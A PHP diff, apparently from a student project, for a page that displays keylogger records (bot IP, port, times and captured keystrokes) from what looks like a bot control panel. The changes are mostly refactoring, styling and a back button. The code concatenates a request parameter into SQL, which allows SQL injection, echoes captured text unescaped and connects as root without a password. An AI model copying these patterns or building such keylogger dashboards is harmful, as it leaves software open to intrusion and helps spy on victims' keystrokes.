@@ -3,26 +3,34 @@
 $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 if (mysqli_connect_errno()) exit;
 
+$header_display = "Keylogger Detail ";
+$IdKeylogger ="" ;
+$Ip = "";
+$Port = "";
+$TimeStart = "";
+$TimeStop = "";
+$KeyloggerResult = "";
+
 
 if (isset($_REQUEST['IdKeylogger'])) {
-    $id = $_REQUEST['IdKeylogger'];
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
-    $sql = "Select keylogger.IdKeylogger, keylogger.TimeStart,keylogger.TimeStop,keylogger.KeyloggerResult, bot.Ip, bot.Port from keylogger,bot where keylogger.IdKeylogger = " . $id . " and bot.Id = keylogger.IdBot";
-    $rs = mysqli_query($db, $sql);
-}
-
-$header_display = "Keylogger Detail ";
+  $id = $_REQUEST['IdKeylogger'];
+  $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
+  if (mysqli_connect_errno()) exit;
+  $sql = "Select keylogger.IdKeylogger, keylogger.TimeStart,keylogger.TimeStop,keylogger.KeyloggerResult, bot.Ip, bot.Port from keylogger,bot where keylogger.IdKeylogger = " . $id . " and bot.Id = keylogger.IdBot";
+  $rs = mysqli_query($db, $sql);
 
 
-while ($row = mysqli_fetch_array($rs)) {
+
+  while ($row = mysqli_fetch_array($rs)) {
     $IdKeylogger = $row["IdKeylogger"];
     $Ip = $row["Ip"];
     $Port = $row["Port"];
-    $TimeStart =$row["TimeStart"];
-    $TimeStop= $row["TimeStop"];
+    $TimeStart = $row["TimeStart"];
+    $TimeStop = $row["TimeStop"];
     $KeyloggerResult = $row["KeyloggerResult"];
+  }
 }
+
 
 echo '<!DOCTYPE html>
 <html lang="en">
@@ -169,7 +177,7 @@ echo '<!DOCTYPE html>
         display: flex;
         flex-direction: column;
         align-items: center;
-        /* justify-content: center; */
+        justify-content: space-between;
         width: 100%;
         min-height: 90%;
         padding: 30px;
@@ -228,6 +236,18 @@ echo '<!DOCTYPE html>
             outline: none;
             border-radius: 4px;
         }
+         .content_back
+        {
+            margin-top:16px;
+            color: #00ff00;
+            border:none;
+            outline: none;
+            font-size:16px;
+            text-decoration: underline;
+            background: transparent;
+            cursor:pointer;
+            align-self: flex-start;
+        }
     </style>
   </head>
 
@@ -282,7 +302,7 @@ echo '<!DOCTYPE html>
             <label class="content_element-label" for="ip">Time Start</label>
             <input
               class="content_element-input"
-                value="' . $TimeStart .'"
+                value="' . $TimeStart . '"
               readonly
             />
           </div>
@@ -290,7 +310,7 @@ echo '<!DOCTYPE html>
             <label class="content_element-label" for="ip">Time Stop</label>
             <input
               class="content_element-input"
-                value="' . $TimeStop .'"
+                value="' . $TimeStop . '"
               readonly
             />
           </div>
@@ -303,6 +323,8 @@ echo '<!DOCTYPE html>
                 rows="8"
             >' . $KeyloggerResult . '</textarea>
           </div>
+          <button class="content_back" onclick="history.back()">Go Back</button>
+
         </div>
       </div>
       <div class="navigate">
